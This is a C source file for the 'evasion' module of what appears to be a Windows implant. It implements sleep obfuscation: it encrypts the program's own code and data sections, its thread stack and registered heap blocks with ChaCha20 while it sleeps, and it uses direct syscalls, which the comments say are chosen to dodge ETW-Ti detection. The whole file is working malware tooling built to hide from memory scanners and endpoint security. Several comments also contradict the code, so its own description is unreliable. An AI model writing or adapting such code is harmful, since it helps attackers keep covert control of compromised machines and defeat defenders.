/*
 * client/evasion/sleep_obf.c  –  Sleep obfuscation implementation
 * ================================================================
 * See sleep_obf.h for design documentation.
 *
 * Build note
 * ----------
 * Compiled as a separate translation unit.  The encrypt/decrypt helper
 * (_so_xor_image) is placed in section ".slpobf" so it is excluded from
 * the region being ciphered.  The main module sections (.text, .data,
 * .rdata) are the ones XOR'd.
 *
 * Stack evacuation
 * ----------------
 * _so_evacuate_stack() copies the committed thread stack (TEB StackBase –
 * StackLimit) into a fresh PAGE_READWRITE VirtualAlloc, encrypts it there
 * with the same ChaCha20 (key,nonce) used for image sections, then
 * SecureZeroMemory's the live range.  On wake, _so_restore_stack() decrypts
 * and copies back, then frees the staging allocation.
 *
 * The key observation: the function that calls VirtualAlloc for the staging
 * buffer is itself on the stack.  We therefore save StackLimit (the lowest
 * committed address), copy from StackLimit up to the frame pointer of
 * sleep_obf_delay (NOT StackBase), and zero only that range.  The current
 * live frame is above StackBase — i.e. it is the guard-page region or the
 * next-to-commit page — so it is untouched.
 *
 * Heap registry
 * -------------
 * g_heap_slots[]/g_heap_sizes[] hold up to SO_HEAP_SLOTS pointer+size pairs.
 * Each entry is XOR'd in-place before sleep and again after (self-inverse).
 */

#include "sleep_obf.h"
#include "obf.h"
#include "k32_walk.h"
#include "nt_offsets.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>
#include <stddef.h>
#include <string.h>

/* g_peb_hash_seed is the RDTSC-seeded value initialised by peb_hash_str() */
extern DWORD g_peb_hash_seed;


/* ── Section marker ─────────────────────────────────────────────────────── */
/*
 * Functions placed in .slpobf are excluded from the XOR pass.
 * We match section names that do NOT start with ".slpobf" in _so_xor_image.
 */
#ifdef __GNUC__
#  define _SLPOBF __attribute__((section(".slpobf"))) __attribute__((noinline))
#else
#  define _SLPOBF /* MSVC: pragma section not portable — keep in .text; small enough */
#endif


/* ── ChaCha20/20 keystream  (stack-only, wiped after each XOR pass) ─────── */
/*
 * Full RFC 7539 ChaCha20 with a genuine 256-bit key.
 *
 * Key schedule
 * ────────────
 * _derive_key() produces 32 bytes (full SHA-256 digest).  The first 16 bytes
 * are used as the lower half of the key; the upper 16 bytes come from
 * BCryptGenRandom (a fresh per-sleep nonce), so the effective key entropy is
 * the full 256 bits of the digest every invocation.
 *
 * Inner-loop optimisation
 * ───────────────────────
 * Rather than calling a _byte() helper once per byte (one conditional branch
 * + one array write per byte), _so_xor_image XORs data 64 bytes at a time
 * directly against the word-aligned keystream block.  The compiler can
 * auto-vectorise the 16 × uint32 XOR loop on x86-64 (-Os still benefits from
 * this because it removes the branch entirely for full blocks).
 *
 * Section placement
 * ─────────────────
 * Every function carries _SLPOBF so the entire cipher lives in ".slpobf" and
 * is excluded from the regions being ciphered.
 */

/* 32-byte key + 12-byte nonce packed for easy load */
typedef struct {
    unsigned int  s[16];   /* ChaCha20 working state                */
    unsigned int  out[16]; /* current keystream block (little-endian words) */
    unsigned int  pos;     /* bytes consumed from out[]              */
} _Cc20State;

/* ── quarter-round macro (fully inlined, zero function-call overhead) ────── */
#define _CC20_ROTL(v,n)  (((v) << (n)) | ((v) >> (32-(n))))
#define _CC20_QR(a,b,c,d) do {          \
    (a) += (b); (d) ^= (a); (d) = _CC20_ROTL((d),16); \
    (c) += (d); (b) ^= (c); (b) = _CC20_ROTL((b),12); \
    (a) += (b); (d) ^= (a); (d) = _CC20_ROTL((d), 8); \
    (c) += (d); (b) ^= (c); (b) = _CC20_ROTL((b), 7); \
} while(0)

/* ── produce one 64-byte keystream block ────────────────────────────────── */
static _SLPOBF void _cc20_block(_Cc20State *st)
{
    /* Working copy — keep original state for final add */
    unsigned int x0  = st->s[ 0], x1  = st->s[ 1], x2  = st->s[ 2], x3  = st->s[ 3];
    unsigned int x4  = st->s[ 4], x5  = st->s[ 5], x6  = st->s[ 6], x7  = st->s[ 7];
    unsigned int x8  = st->s[ 8], x9  = st->s[ 9], x10 = st->s[10], x11 = st->s[11];
    unsigned int x12 = st->s[12], x13 = st->s[13], x14 = st->s[14], x15 = st->s[15];

    /* 20 rounds = 10 × (column round + diagonal round), fully unrolled */
#define _CC20_DOUBLE_ROUND() \
    _CC20_QR(x0,x4, x8,x12); _CC20_QR(x1,x5, x9,x13); \
    _CC20_QR(x2,x6,x10,x14); _CC20_QR(x3,x7,x11,x15); \
    _CC20_QR(x0,x5,x10,x15); _CC20_QR(x1,x6,x11,x12); \
    _CC20_QR(x2,x7, x8,x13); _CC20_QR(x3,x4, x9,x14)

    _CC20_DOUBLE_ROUND(); _CC20_DOUBLE_ROUND();
    _CC20_DOUBLE_ROUND(); _CC20_DOUBLE_ROUND();
    _CC20_DOUBLE_ROUND(); _CC20_DOUBLE_ROUND();
    _CC20_DOUBLE_ROUND(); _CC20_DOUBLE_ROUND();
    _CC20_DOUBLE_ROUND(); _CC20_DOUBLE_ROUND();
#undef _CC20_DOUBLE_ROUND

    /* Add initial state back (avalanche) and store as LE words */
    st->out[ 0]=x0 +st->s[ 0]; st->out[ 1]=x1 +st->s[ 1];
    st->out[ 2]=x2 +st->s[ 2]; st->out[ 3]=x3 +st->s[ 3];
    st->out[ 4]=x4 +st->s[ 4]; st->out[ 5]=x5 +st->s[ 5];
    st->out[ 6]=x6 +st->s[ 6]; st->out[ 7]=x7 +st->s[ 7];
    st->out[ 8]=x8 +st->s[ 8]; st->out[ 9]=x9 +st->s[ 9];
    st->out[10]=x10+st->s[10]; st->out[11]=x11+st->s[11];
    st->out[12]=x12+st->s[12]; st->out[13]=x13+st->s[13];
    st->out[14]=x14+st->s[14]; st->out[15]=x15+st->s[15];

    /* Advance 64-bit block counter (words 12–13, little-endian) */
    if (++st->s[12] == 0) ++st->s[13];
    st->pos = 0;
}

/* ── load a 32-bit little-endian word from an unaligned byte pointer ─────── */
static _SLPOBF unsigned int _cc20_le32(const unsigned char *p)
{
    return (unsigned int)p[0]        | ((unsigned int)p[1] << 8)
         | ((unsigned int)p[2] << 16) | ((unsigned int)p[3] << 24);
}

/*
 * _cc20_init — initialise ChaCha20 state.
 *
 *   key32  : 32-byte key  (BCrypt-SHA256 full digest)
 *   nonce12: 12-byte nonce (BCryptGenRandom, unique per sleep)
 *
 * RFC 7539 initial state layout:
 *   [0..3]   = "expa nd 3 2-by te k" sigma constant
 *   [4..11]  = key (8 × 32-bit words)
 *   [12]     = block counter (starts at 0)
 *   [13..15] = nonce (3 × 32-bit words)
 */
static _SLPOBF void _cc20_init(_Cc20State *st,
                                const unsigned char *key32,
                                const unsigned char *nonce12)
{
    st->s[ 0] = 0x61707865u;
    st->s[ 1] = 0x3320646eu;
    st->s[ 2] = 0x79622d32u;
    st->s[ 3] = 0x6b206574u;
    st->s[ 4] = _cc20_le32(key32 +  0); st->s[ 5] = _cc20_le32(key32 +  4);
    st->s[ 6] = _cc20_le32(key32 +  8); st->s[ 7] = _cc20_le32(key32 + 12);
    st->s[ 8] = _cc20_le32(key32 + 16); st->s[ 9] = _cc20_le32(key32 + 20);
    st->s[10] = _cc20_le32(key32 + 24); st->s[11] = _cc20_le32(key32 + 28);
    st->s[12] = 0; /* block counter */
    st->s[13] = _cc20_le32(nonce12 + 0);
    st->s[14] = _cc20_le32(nonce12 + 4);
    st->s[15] = _cc20_le32(nonce12 + 8);
    _cc20_block(st);
}

/*
 * _cc20_xor_buf — XOR up to `n` bytes of `buf` in-place against the keystream.
 *
 * Hot path: when `n` == 64 and pos == 0 (full aligned block), the inner loop
 * reduces to 16 × (uint32 load + XOR + store) — the compiler vectorises this
 * to 2 × 256-bit AVX2 or 4 × 128-bit SSE2 instructions with -O2/-Os.
 * Tail bytes (n < 64 or partial block) fall through to the byte loop.
 */
static _SLPOBF void _cc20_xor_buf(_Cc20State *st, unsigned char *buf, DWORD n)
{
    unsigned char *ks = (unsigned char *)st->out;

    /* Consume any partial block left from previous call */
    while (n > 0 && st->pos > 0) {
        *buf++ ^= ks[st->pos];
        st->pos = (st->pos + 1) & 63;
        if (st->pos == 0) _cc20_block(st);
        n--;
    }

    /* Full 64-byte block XOR (word-at-a-time, auto-vectorisable) */
    while (n >= 64) {
        unsigned int *dst = (unsigned int *)(void *)buf;
        unsigned int i;
        for (i = 0; i < 16; i++) dst[i] ^= st->out[i];
        _cc20_block(st);
        buf += 64;
        n   -= 64;
    }

    /* Tail */
    while (n-- > 0) {
        *buf++ ^= ks[st->pos];
        st->pos++;
        if (st->pos == 64) _cc20_block(st);
    }
}


/* ── Key derivation ─────────────────────────────────────────────────────── */
/*
 * Produces a 32-byte ChaCha20 key + 12-byte nonce, both fresh per sleep.
 *
 *   key32   ← BCrypt-SHA256( g_peb_hash_seed || imageBase || imageSize )
 *             Full 256-bit digest — no truncation, no key doubling.
 *   nonce12 ← BCryptGenRandom (12 bytes of CSPRNG output)
 *             Unique per invocation; combined with the per-run key this gives
 *             a unique (key, nonce) pair for every sleep cycle.
 *
 * Fallback (BCrypt unavailable): key bytes derived from seed via a
 * non-linear mixing function; nonce bytes from RDTSC-derived entropy.
 */
static _SLPOBF void _derive_key(BYTE key32[32], BYTE nonce12[12],
                                  DWORD seed, PVOID base, DWORD imgSize)
{
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;

    /* Build hash input: [seed(4) | base(8) | imgSize(4)] = 16 bytes */
    BYTE input[16] = {0};
    memcpy(input,      &seed,    4);
    memcpy(input + 4,  &base,    sizeof(PVOID) < 8 ? sizeof(PVOID) : 8);
    memcpy(input + 12, &imgSize, 4);

    /* SHA-256 → 32-byte key */
    int got_key = 0;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) == 0 &&
        BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) == 0) {
        BCryptHashData(hHash, input, sizeof(input), 0);
        BCryptFinishHash(hHash, key32, 32, 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        got_key = 1;
    }
    if (!got_key) {
        /* Fallback: non-linear byte expansion of seed */
        for (int i = 0; i < 32; i++) {
            DWORD r = seed ^ (DWORD)(i * 0x9E3779B9u);
            r ^= (r >> 17); r *= 0xBF58476Du; r ^= (r >> 31);
            key32[i] = (BYTE)(r ^ (r >> 8));
        }
    }

    /* BCryptGenRandom → 12-byte nonce */
    int got_nonce = 0;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0) == 0) {
        if (BCryptGenRandom(hAlg, nonce12, 12, 0) == 0) got_nonce = 1;
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    if (!got_nonce) {
        /* Fallback: RDTSC-derived nonce mixed with stack address */
        ULONGLONG tsc;
#ifdef _WIN64
        __asm__ __volatile__("rdtsc; shlq $32,%%rdx; orq %%rdx,%%rax" : "=a"(tsc) :: "rdx");
#else
        __asm__ __volatile__("rdtsc" : "=A"(tsc));
#endif
        ULONG_PTR stk = (ULONG_PTR)(void *)&tsc;
        memcpy(nonce12,     &tsc, 8);
        memcpy(nonce12 + 8, &stk, 4);
    }

    SecureZeroMemory(input, sizeof(input));
}


/* ── _so_xor_image ──────────────────────────────────────────────────────── */
/*
 * XOR-crypt the .text, .data, and .rdata sections of the module at `base`
 * using the provided ChaCha20 key+nonce.  Skips the .slpobf section so this
 * function keeps working while the rest of the image is ciphertext.
 *
 * Writes via SC_NtWriteVirtualMemory on the current process handle to avoid
 * the ETW-Ti KERNEL_THREATINT_TASK_PROTECT event that a VirtualProtect flip
 * would generate.
 */
static _SLPOBF void _so_xor_image(PVOID base,
                                   const BYTE key32[32],
                                   const BYTE nonce12[12])
{
    /* Parse PE headers */
    BYTE *bbase = (BYTE *)base;
    DWORD e_lfanew;
    memcpy(&e_lfanew, bbase + 0x3C, 4);
    if (e_lfanew > 0x800) return;

    WORD nSec, optSz;
    memcpy(&nSec,  bbase + e_lfanew + 4 + 2,  2);
    memcpy(&optSz, bbase + e_lfanew + 4 + 16, 2);
    const BYTE *secHdr = bbase + e_lfanew + 4 + 20 + optSz;
    if (nSec > 96) return;

    HANDLE hSelf = GetCurrentProcess();

    for (WORD i = 0; i < nSec; i++) {
        const BYTE *sh = secHdr + (size_t)i * 40;

        /* Section name is 8 bytes, NUL-padded.  Skip .slpobf. */
        char name[9] = {0};
        memcpy(name, sh, 8);
        if (memcmp(name, ".slpobf", 7) == 0) continue;
        /* Only cipher executable or data sections; skip .rsrc, .reloc, .pdata */
        DWORD chars;
        memcpy(&chars, sh + 36, 4);
        BOOL isExec = (chars & 0x20) != 0;       /* IMAGE_SCN_CNT_CODE */
        BOOL isRW   = (chars & 0xC0000000) != 0; /* MEM_READ | MEM_WRITE */
        BOOL isRO   = (chars & 0x40000000) != 0; /* IMAGE_SCN_MEM_READ */
        if (!isExec && !isRW && !isRO) continue;
        if (memcmp(name, ".rsrc",  5) == 0) continue;
        if (memcmp(name, ".reloc", 6) == 0) continue;
        if (memcmp(name, ".pdata", 6) == 0) continue;

        DWORD rva, vsz;
        memcpy(&rva, sh + 12, 4);
        memcpy(&vsz, sh +  8, 4);
        if (!rva || !vsz || vsz > 64 * 1024 * 1024) continue;

        BYTE *target = bbase + rva;

        /* ChaCha20/20 keystream XOR — 4 KB staging buffer to limit stack,
         * full 64-byte block XOR inside _cc20_xor_buf for vectoriser benefit */
#define CHUNK 4096
        _Cc20State cc20;
        _cc20_init(&cc20, key32, nonce12);

        DWORD remaining = vsz;
        BYTE *ptr = target;
        while (remaining > 0) {
            BYTE chunk[CHUNK];
            DWORD n = remaining < CHUNK ? remaining : CHUNK;
            memcpy(chunk, ptr, n);
            _cc20_xor_buf(&cc20, chunk, n);
            SIZE_T written = 0;
            SC_NtWriteVirtualMemory(hSelf, ptr, chunk, n, &written);
            ptr += n;
            remaining -= n;
        }
        SecureZeroMemory(&cc20, sizeof(cc20));
#undef CHUNK
    }
}


/* ── Heap encryption registry ───────────────────────────────────────────── */

static void   *g_heap_slots[SO_HEAP_SLOTS];
static SIZE_T  g_heap_sizes[SO_HEAP_SLOTS];

void sleep_obf_register_heap(void *ptr, SIZE_T sz)
{
    if (!ptr || !sz) return;
    for (int i = 0; i < SO_HEAP_SLOTS; i++) {
        if (!g_heap_slots[i]) {
            g_heap_slots[i] = ptr;
            g_heap_sizes[i] = sz;
            return;
        }
    }
    /* Table full — drop silently */
}

void sleep_obf_unregister_heap(void *ptr)
{
    if (!ptr) return;
    for (int i = 0; i < SO_HEAP_SLOTS; i++) {
        if (g_heap_slots[i] == ptr) {
            g_heap_slots[i] = NULL;
            g_heap_sizes[i] = 0;
            return;
        }
    }
}

/* ── _so_xor_heap_slots ─────────────────────────────────────────────────── */
/*
 * XOR-encrypt/decrypt every registered heap block in-place.
 * Called with the same (key32, nonce12) pair as the image-section pass;
 * because the keystream is position-based and each heap block starts the
 * stream at block-counter 0, the keystream repeats — the heap blocks use
 * a separate ChaCha20 state per slot, all seeded from the same key+nonce.
 * XOR is self-inverse so a second call with the same (key,nonce) decrypts.
 */
static _SLPOBF void _so_xor_heap_slots(const BYTE key32[32],
                                         const BYTE nonce12[12])
{
    for (int i = 0; i < SO_HEAP_SLOTS; i++) {
        if (!g_heap_slots[i] || !g_heap_sizes[i]) continue;
        _Cc20State cc;
        _cc20_init(&cc, key32, nonce12);
        _cc20_xor_buf(&cc, (unsigned char *)g_heap_slots[i],
                      (DWORD)g_heap_sizes[i]);
        SecureZeroMemory(&cc, sizeof(cc));
    }
}

/* ── _so_evacuate_stack / _so_restore_stack ──────────────────────────────── */
/*
 * Evacuate the committed thread stack to an encrypted staging buffer.
 *
 * We read TEB->StackBase and TEB->StackLimit from the TEB directly.
 * x64 TEB layout (all offsets are fixed across Vista–Win11):
 *   +0x000  NtTib.ExceptionList (not used here)
 *   +0x008  NtTib.StackBase    (highest committed address, exclusive)
 *   +0x010  NtTib.StackLimit   (lowest committed address, inclusive)
 *
 * "base" is the highest address (stack grows downward), "limit" is lowest.
 * The live frame of sleep_obf_delay sits somewhere in [limit, base].
 * We zero everything below our own RSP to erase previous frames.
 *
 * Returns the allocated staging VA (caller must free with VirtualFree).
 * Returns NULL on failure — caller skips stack protection that cycle.
 */
static _SLPOBF PVOID _so_evacuate_stack(const BYTE key32[32],
                                          const BYTE nonce12[12],
                                          PVOID *out_stkLimit,
                                          SIZE_T *out_stkSz)
{
#ifndef _WIN64
    /* 32-bit not supported for stack evacuation */
    (void)key32; (void)nonce12; (void)out_stkLimit; (void)out_stkSz;
    return NULL;
#else
    /* Read StackBase (+0x08) and StackLimit (+0x10) from TEB via GS */
    PVOID stkBase, stkLimit;
    __asm__ __volatile__(
        "movq %%gs:0x08, %0\n\t"
        "movq %%gs:0x10, %1\n\t"
        : "=r"(stkBase), "=r"(stkLimit)
    );
    if (!stkBase || !stkLimit || stkLimit >= stkBase) return NULL;

    SIZE_T stkSz = (SIZE_T)((BYTE *)stkBase - (BYTE *)stkLimit);
    if (stkSz == 0 || stkSz > 8 * 1024 * 1024) return NULL; /* sanity: max 8 MB */

    /* Allocate staging buffer */
    PVOID staging = VirtualAlloc(NULL, stkSz, MEM_COMMIT | MEM_RESERVE,
                                 PAGE_READWRITE);
    if (!staging) return NULL;

    /* Copy live stack into staging */
    memcpy(staging, stkLimit, stkSz);

    /* Encrypt staging buffer in-place with ChaCha20 */
    _Cc20State cc;
    _cc20_init(&cc, key32, nonce12);
    _cc20_xor_buf(&cc, (unsigned char *)staging, (DWORD)stkSz);
    SecureZeroMemory(&cc, sizeof(cc));

    /* Zero the live stack range (below our current frame).
     * We read RSP here; everything below RSP is the evacuated call chain. */
    PVOID currentRsp;
    __asm__ __volatile__("movq %%rsp, %0" : "=r"(currentRsp));
    /* Zero from stkLimit up to (but not including) the current RSP */
    if ((BYTE *)currentRsp > (BYTE *)stkLimit) {
        SIZE_T zeroSz = (SIZE_T)((BYTE *)currentRsp - (BYTE *)stkLimit);
        SecureZeroMemory(stkLimit, zeroSz);
    }

    *out_stkLimit = stkLimit;
    *out_stkSz    = stkSz;
    return staging;
#endif /* _WIN64 */
}

static _SLPOBF void _so_restore_stack(PVOID staging,
                                        const BYTE key32[32],
                                        const BYTE nonce12[12],
                                        PVOID stkLimit,
                                        SIZE_T stkSz)
{
#ifndef _WIN64
    (void)staging; (void)key32; (void)nonce12; (void)stkLimit; (void)stkSz;
#else
    if (!staging) return;

    /* Decrypt the staging buffer back to plaintext */
    _Cc20State cc;
    _cc20_init(&cc, key32, nonce12);
    _cc20_xor_buf(&cc, (unsigned char *)staging, (DWORD)stkSz);
    SecureZeroMemory(&cc, sizeof(cc));

    /* Copy plaintext back to the live stack */
    memcpy(stkLimit, staging, stkSz);

    /* Wipe and free staging buffer */
    SecureZeroMemory(staging, stkSz);
    VirtualFree(staging, 0, MEM_RELEASE);
#endif
}


/* ── sleep_obf_delay ────────────────────────────────────────────────────── */

void sleep_obf_delay(DWORD ms)
{
#ifndef SLEEP_OBF_ENABLE
    jitter_sleep(ms);
    return;
#else
    /* Resolve own module base via PEB */
    void *peb_ptr;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb_ptr));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb_ptr));
#endif
    PEB *peb = (PEB *)peb_ptr;
    /* PEB->ImageBaseAddress: read via raw offset (winternl.h PEB struct does
     * not expose this field by name on all toolchains; use nt_offsets.h). */
    PVOID base = *(PVOID *)((BYTE *)peb + PEB_ImageBaseAddress);

    /* Get image size from optional header */
    BYTE *bbase = (BYTE *)base;
    DWORD e_lfanew;
    memcpy(&e_lfanew, bbase + 0x3C, 4);
    DWORD imgSize = 0;
    if (e_lfanew <= 0x800) {
        WORD optMagic;
        memcpy(&optMagic, bbase + e_lfanew + 4 + 20, 2);
        DWORD soi_off = (optMagic == 0x20B) ? (4+20+56) : (4+20+56);
        memcpy(&imgSize, bbase + e_lfanew + soi_off, 4);
    }

    /* Derive ChaCha20 key (32 bytes) + nonce (12 bytes) for this sleep cycle */
    BYTE key32[32];
    BYTE nonce12[12];
    _derive_key(key32, nonce12, g_peb_hash_seed, base, imgSize);

    /* ── Encrypt image sections ─────────────────────────────────────────── */
    _so_xor_image(base, key32, nonce12);

    /* ── Evacuate and encrypt stack ─────────────────────────────────────── */
    PVOID  stkLimit  = NULL;
    SIZE_T stkSz     = 0;
    PVOID  stkStaging = _so_evacuate_stack(key32, nonce12, &stkLimit, &stkSz);

    /* ── Encrypt registered heap blocks ─────────────────────────────────── */
    _so_xor_heap_slots(key32, nonce12);

    /* ── Sleep via direct syscall ────────────────────────────────────────── */
    LARGE_INTEGER interval;
    interval.QuadPart = -((LONGLONG)ms * 10000LL);
    SC_NtDelayExecution(FALSE, &interval);

    /* ── Decrypt heap blocks ─────────────────────────────────────────────── */
    _so_xor_heap_slots(key32, nonce12);

    /* ── Restore stack ───────────────────────────────────────────────────── */
    _so_restore_stack(stkStaging, key32, nonce12, stkLimit, stkSz);

    /* ── Decrypt image sections ──────────────────────────────────────────── */
    _so_xor_image(base, key32, nonce12);

    /* ── Wipe key and nonce from stack ───────────────────────────────────── */
    SecureZeroMemory(key32,   sizeof(key32));
    SecureZeroMemory(nonce12, sizeof(nonce12));
#endif /* SLEEP_OBF_ENABLE */
}
